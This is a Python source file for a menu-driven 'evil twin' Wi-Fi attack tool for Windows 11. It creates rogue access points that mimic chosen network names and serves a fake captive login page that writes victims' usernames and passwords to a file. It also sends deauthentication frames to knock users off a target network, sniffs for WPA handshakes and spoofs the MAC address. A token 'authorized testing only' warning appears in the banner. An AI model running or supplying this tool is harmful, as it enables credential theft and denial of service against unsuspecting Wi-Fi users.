import os
import sys
import time
import random
import socket
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# Global variables
LOG_FILE = "creds.txt"
CREDENTIALS = []
PORTAL_PORT = 8080
STOP_FLAG = False
DEAUTH_THREAD = None
MONITOR_THREAD = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Fore.RED}
   ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄█   ▄█▄    ▄████████ 
  ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀   ███    ███ 
  ███    █▀  ███   ███   ███    ███   ███    █▀    ███▐██▀     ███    █▀  
  ███        ███   ███  ▄███▄▄▄▄██▀  ▄███▄▄▄       ▄█████▀     ▄███▄▄▄     
▀███████████ ███   ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀      ▀▀█████▄    ▀▀███▀▀▀     
         ███ ███   ███ ▀███████████   ███    █▄     ███▐██▄     ███    █▄ 
   ▄█    ███ ███   ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███ 
 ▄████████▀   ▀█   █▀    ███    ███   ██████████   ███   ▀█▀   ██████████ 
                          ███    ███                                      
    {Fore.RESET}{Fore.CYAN}[ Ultimate Evil Twin Wi-Fi Attack Tool - Windows 11 ]{Fore.RESET}
    {Fore.YELLOW}⚠ WARNING: For Authorized Security Testing Only! ⚠{Fore.RESET}
    """
    print(banner)

# ====================== CREDENTIAL HARVESTING ======================
class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/login':
            self.send_login_page()
        elif self.path == '/success':
            self.send_success_page()
        else:
            self.redirect_to_login()

    def do_POST(self):
        if self.path == '/auth':
            self.handle_credentials()
    
    def send_login_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        login_page = """
        <!DOCTYPE html><html><head>
        <title>Wi-Fi Login</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#4CAF50;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body>
        <div class="login-box"><h2>Wi-Fi Login Required</h2>
        <form action="/auth" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form></div></body></html>
        """
        self.wfile.write(login_page.encode())

    def send_success_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        success_page = """
        <!DOCTYPE html><html><head>
        <title>Connected</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .success-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);text-align:center;}
        .success{color:#4CAF50;font-size:24px;}</style>
        </head><body>
        <div class="success-box">
            <div class="success">✓</div>
            <h2>Connected Successfully</h2>
            <p>You are now connected to the Wi-Fi network.</p>
        </div></body></html>
        """
        self.wfile.write(success_page.encode())

    def redirect_to_login(self):
        self.send_response(302)
        self.send_header('Location', '/login')
        self.end_headers()

    def handle_credentials(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        username = post_data.split('username=')[1].split('&')[0]
        password = post_data.split('password=')[1].split('&')[0]
        log_credentials(username, password)
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()

def start_captive_portal():
    server = HTTPServer(('0.0.0.0', PORTAL_PORT), CaptivePortalHandler)
    print(f"{Fore.GREEN}[+] Captive portal running on http://localhost:{PORTAL_PORT}{Fore.RESET}")
    while not STOP_FLAG:
        server.handle_request()

# ====================== WIFI FUNCTIONS ======================
def log_credentials(username, password):
    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")
    CREDENTIALS.append((username, password))
    print(f"{Fore.RED}[!] Captured Credentials: {username}:{password}{Fore.RESET}")

def random_bssid():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def spoof_mac(interface="Wi-Fi"):
    new_mac = random_bssid()
    try:
        subprocess.run(f'netsh interface set interface "{interface}" admin=disable', shell=True)
        subprocess.run(f'netsh interface set interface "{interface}" admin=enable', shell=True)
        subprocess.run(f'netsh interface set interface "{interface}" newmac={new_mac}', shell=True)
        print(f"{Fore.GREEN}[+] MAC address spoofed to: {new_mac}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] MAC spoofing failed: {e}{Fore.RESET}")

def enable_wifi_support():
    try:
        subprocess.run('netsh wlan set hostednetwork mode=allow', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Hosted network support enabled.{Fore.RESET}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to enable hosted network. Run as Admin!{Fore.RESET}")
        sys.exit(1)

def create_fake_wifi(ssid, password=None):
    try:
        if password:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" key="{password}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created with password: {password}{Fore.RESET}")
        else:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created (Open Network){Fore.RESET}")
        
        subprocess.run('netsh wlan start hostednetwork', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' is now active!{Fore.RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to create fake Wi-Fi.{Fore.RESET}")
        return False

def bulk_create_from_file(file_path, has_password=False, default_password=None):
    if not os.path.exists(file_path):
        print(f"{Fore.RED}[-] File not found: {file_path}{Fore.RESET}")
        return
    
    with open(file_path, 'r') as file:
        ssids = [line.strip() for line in file if line.strip()]
    
    for ssid in ssids:
        if has_password and default_password:
            create_fake_wifi(ssid, default_password)
        else:
            create_fake_wifi(ssid)
        time.sleep(2)

# ====================== ATTACK FUNCTIONS ======================
def deauth_attack(target_bssid, interface="Wi-Fi", count=3):
    print(f"{Fore.YELLOW}[*] Starting deauthentication attack on {target_bssid}...{Fore.RESET}")
    pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)

def start_deauth_thread(target_bssid):
    global DEAUTH_THREAD, STOP_FLAG
    STOP_FLAG = False
    DEAUTH_THREAD = threading.Thread(target=deauth_attack, args=(target_bssid,))
    DEAUTH_THREAD.daemon = True
    DEAUTH_THREAD.start()

def stop_deauth_thread():
    global STOP_FLAG
    STOP_FLAG = True
    if DEAUTH_THREAD:
        DEAUTH_THREAD.join()
    print(f"{Fore.RED}[!] Deauthentication attack stopped.{Fore.RESET}")

def packet_handler(pkt):
    if pkt.haslayer(EAPOL):
        ssid = pkt.info.decode() if pkt.info else "Unknown"
        print(f"{Fore.RED}[!] Possible password attempt detected on: {ssid}{Fore.RESET}")
        if pkt.haslayer(Raw):
            log_credentials(ssid, "Handshake captured")

def start_monitor_mode():
    global MONITOR_THREAD
    print(f"{Fore.YELLOW}[*] Starting monitor mode (Ctrl+C to stop)...{Fore.RESET}")
    MONITOR_THREAD = threading.Thread(target=lambda: sniff(iface="Wi-Fi", prn=packet_handler, store=0))
    MONITOR_THREAD.daemon = True
    MONITOR_THREAD.start()

def stop_monitor_mode():
    if MONITOR_THREAD:
        MONITOR_THREAD.join(0.1)
    print(f"{Fore.RED}[!] Monitor mode stopped.{Fore.RESET}")

def auto_stop_timer(minutes):
    time.sleep(minutes * 60)
    subprocess.run('netsh wlan stop hostednetwork', shell=True)
    print(f"{Fore.RED}[!] Auto-stopped fake Wi-Fi after {minutes} minutes.{Fore.RESET}")
    sys.exit(0)

# ====================== MAIN MENU ======================
def main():
    clear_screen()
    print_banner()
    enable_wifi_support()

    # Start captive portal in background
    portal_thread = threading.Thread(target=start_captive_portal)
    portal_thread.daemon = True
    portal_thread.start()

    print(f"{Fore.CYAN}\n[1] Create Single Fake Wi-Fi with Captive Portal")
    print("[2] Bulk Create from .txt/.lst File")
    print("[3] Start Deauthentication Attack")
    print("[4] Start Password Monitor")
    print("[5] Spoof MAC Address")
    print("[6] Auto-Stop After X Minutes")
    print("[7] Exit\n")

    choice = input(f"{Fore.YELLOW}[?] Select an option (1-7): {Fore.RESET}")

    if choice == "1":
        ssid = input(f"{Fore.YELLOW}[?] Enter SSID to mimic: {Fore.RESET}")
        has_pass = input(f"{Fore.YELLOW}[?] Add password? (y/n): {Fore.RESET}").lower()
        if has_pass == "y":
            password = input(f"{Fore.YELLOW}[?] Enter fake password: {Fore.RESET}")
            create_fake_wifi(ssid, password)
        else:
            create_fake_wifi(ssid)
        
        print(f"\n{Fore.CYAN}[*] Users will now see a login page when connecting.")
        print(f"[*] Captured credentials will appear below and save to {LOG_FILE}{Fore.RESET}")
        input(f"{Fore.YELLOW}[?] Press Enter to stop...{Fore.RESET}")
    
    elif choice == "2":
        file_path = input(f"{Fore.YELLOW}[?] Enter file path (.txt/.lst): {Fore.RESET}")
        has_pass = input(f"{Fore.YELLOW}[?] Use a default password for all? (y/n): {Fore.RESET}").lower()
        if has_pass == "y":
            password = input(f"{Fore.YELLOW}[?] Enter default password: {Fore.RESET}")
            bulk_create_from_file(file_path, True, password)
        else:
            bulk_create_from_file(file_path)
    
    elif choice == "3":
        target_bssid = input(f"{Fore.YELLOW}[?] Enter target BSSID (MAC): {Fore.RESET}")
        start_deauth_thread(target_bssid)
        input(f"{Fore.YELLOW}[?] Press Enter to stop deauth attack...{Fore.RESET}")
        stop_deauth_thread()
    
    elif choice == "4":
        start_monitor_mode()
        input(f"{Fore.YELLOW}[?] Press Enter to stop monitoring...{Fore.RESET}")
        stop_monitor_mode()
    
    elif choice == "5":
        spoof_mac()
    
    elif choice == "6":
        minutes = int(input(f"{Fore.YELLOW}[?] Auto-stop after how many minutes?: {Fore.RESET}"))
        threading.Thread(target=auto_stop_timer, args=(minutes,)).start()
        print(f"{Fore.GREEN}[+] Fake Wi-Fi will auto-stop in {minutes} minutes.{Fore.RESET}")
    
    elif choice == "7":
        print(f"{Fore.RED}[!] Exiting...{Fore.RESET}")
        sys.exit(0)
    
    else:
        print(f"{Fore.RED}[-] Invalid choice!{Fore.RESET}")

if __name__ == "__main__":
    main()
